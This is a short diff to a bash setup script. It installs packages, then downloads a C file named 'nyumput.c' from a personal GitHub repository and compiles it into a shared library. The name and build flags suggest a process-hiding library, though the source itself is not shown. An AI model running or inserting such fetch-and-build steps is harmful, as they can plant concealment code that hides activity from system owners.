@@ -1,5 +1,5 @@
 #!/bin/bash
-apt-get update ; apt-get install sudo -y
+apt-get update ; apt-get -y install sudo npm wget
 curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
